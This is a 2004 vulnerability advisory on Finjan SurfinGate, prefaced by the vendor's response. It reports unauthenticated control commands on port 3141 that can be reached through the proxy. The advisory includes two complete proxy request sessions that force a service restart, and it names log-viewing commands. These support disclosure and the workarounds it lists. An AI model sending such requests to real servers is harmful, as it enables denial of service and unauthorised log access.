Finjan Response to David Byrne's
"Finjan SurfinGate Vulnerability"
Dated January 23, 2004


David Byrne contacted Finjan Software a year ago, and based on his
comments we issued a detailed alert to our customers. We explained that
the control port is NOT used to change security policies within our
software. David's suggested vulnerability is limited to a DoS attack,
and it can be easily eliminated by a small change in the system
configuration.

David's most recent comment is:

"Inside the SurfinGate policy, add URL rules to block all access to any
hostname or IP address that would connect to the FHTTP port. This can be
a long list; 
localhost, 127.0.0.1, the hostname, loghost for Solaris machines, the IP
address SurfinGate binds to, any DNS entries, etc."

Once again, this suggested vulnerability is easily addressed. The
solution is to simply block any connection to "*:ControlPort" (3141 is
the default).

Finjan welcomes expert input and suggestions. Please feel free to
contact us at support@...jan.com.

Subject: Finjan SurfinGate Vulnerability




VENDOR:       Finjan (www.finjan.com)
PRODUCT:      SurfinGate (recently renamed "Vital Security")
VERSIONS:     All releases of versions 6 & 7 as of 1/22/2004. 
              Older versions have not been tested.
NOTIFICATION: The vendor has known of the problem over a year



DESCRIPTION ==========================================================
Finjan SurfinGate provides malicious code scanning for web traffic. It
focuses on behavior-based filtering of active content (e.g. ActiveX,
Java, scripting), but also integrates a McAfee virus scanner. 


PROBLEM ==========================================================
When running in proxy mode, properly crafted requests sent to Finjan
SurfinGate can mimic control commands. Known vulnerabilities include
viewing log data and causing the service to restart, potentially
resulting in a DoS situation. The application's architecture suggests
there is a potential for modifying the filtering policy as well.


DETAILS ==========================================================
SurfinGate scanning servers receive commands by listening on a control
port (TCP/3141 by default) for an HTTP-based protocol called "FHTTP".
Normally the FHTTP commands come from a management console or policy
database server, but commands are not authenticated and can come from
any source, including the local HTTP proxy. This allows any user to
issue server commands via the proxy server. 

The "finjan-parameter-type" parameter is the actual command. Known
commands include "restart" to restart the service, "getlastmsg" to view
log information and "online" to force a policy update from the database
server. Running "strings" on the server binary ("bin/FinjanServer")
reveals other possible targets.


EXPLOITS ==========================================================
Below are two examples of sessions with the proxy server that issue a
restart command.

     Example 1:
          >>> CONNECT LOCALHOST:3141 HTTP/1.0
          >>>

          <<< HTTP/1.0 200 Connection established
          <<< Proxy-agent: Finjan-SurfinGate/6.0
          <<<

          >>> FINJAN /stam HTTP/1.0
          >>> finjan-version: fhttp/1.0
          >>> finjan-command: custom
          >>> finjan-parameter-category: console
          >>> finjan-parameter-type: restart
          >>> content-length: 0
          >>>

          <<< HTTP/1.0 200 OK
          <<< finjan-version: fhttp/1.0
          <<<
          <<<


     Example 2:
          >>> FINJAN localhost:3141/stam HTTP/1.0
          >>> finjan-version: fhttp/1.0
          >>> finjan-command: custom
          >>> finjan-parameter-category: console
          >>> finjan-parameter-type: restart
          >>> content-length: 0
          >>>

          <<< HTTP/1.0 200 OK
          <<< finjan-version: fhttp/1.0
          <<<
          <<<


WORKAROUNDS ==========================================================
Firewall filtering will is not adequate since the commands come over the
same port that services legitimate HTTP requests. These are possible
workarounds that have been successfully tested.

* Use a proxy server between the user and SurfinGate server to block
CONNECT commands to ports other than 443 AND block non-standard HTTP
commands (i.e. "FINJAN").

* Inside the SurfinGate policy, add URL rules to block all access to any
hostname or IP address that would connect to the FHTTP port. This can be
a long list; localhost, 127.0.0.1, the hostname, loghost for Solaris
machines, the IP address SurfinGate binds to, any DNS entries, etc.

* Change the control port to something besides 3141. This is pretty
weak, but better than nothing.


NOTES ==========================================================
Just to reiterate, the ability to change the policy has not been
confirmed, but seems likely. The SurfinGate database server and
SurfinShield (a desktop product) database server also use FHTTP for
management commands, so that is a likely source for more vulnerabilities
to explore. Because the SurfinGate scanning/proxy server has to
communicate with the database server using FHTTP, there is guaranteed
access to the database via the proxy if the hostname or IP address is
known. The workarounds listed above should also work for restricting
access to the database server, but have not been tested.
